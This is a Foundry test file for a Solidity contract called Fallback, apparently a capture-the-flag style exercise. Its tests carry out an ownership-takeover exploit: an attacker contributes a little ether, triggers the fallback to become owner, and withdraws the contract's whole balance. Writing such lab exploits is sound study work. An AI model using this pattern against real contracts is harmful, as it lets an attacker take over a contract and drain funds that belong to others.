// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../../src/Fallback.sol";
import {DeployFallback} from "../../script/deploy/DeployFallback.s.sol";

contract FallbackTest is Test {
    DeployFallback deployFallback;
    Fallback fb;

    address TEST_USER_ATTACKER = makeAddr("userAttacker");
    uint256 constant STARTTING_BALANCE = 100 ether;

    function setUp() external {
        vm.deal(TEST_USER_ATTACKER, STARTTING_BALANCE);

        deployFallback = new DeployFallback();
        fb = deployFallback.run();
    }

    function testOwnerIsSender() public {
        assertEq(fb.owner(), msg.sender);
    }

    function testAttackerChangeOwner() public {
        vm.startPrank(TEST_USER_ATTACKER);
        fb.contribute{value: 0.0001 ether}();
        (bool output,) = address(fb).call{value: 1 ether}("");
        require(output);
        vm.stopPrank();

        assertEq(fb.owner(), TEST_USER_ATTACKER);
    }

    function testAttackerWithdrawAllFunds() public {
        vm.startPrank(TEST_USER_ATTACKER);
        assertEq(fb.owner(), msg.sender);

        fb.contribute{value: 0.0001 ether}();
        (bool output,) = address(fb).call{value: 1 ether}("");
        require(output);
        assert(address(fb).balance > 0);
        assertEq(fb.owner(), TEST_USER_ATTACKER);

        fb.withdraw();
        assertEq(address(fb).balance, 0);
        vm.stopPrank();
    }
}
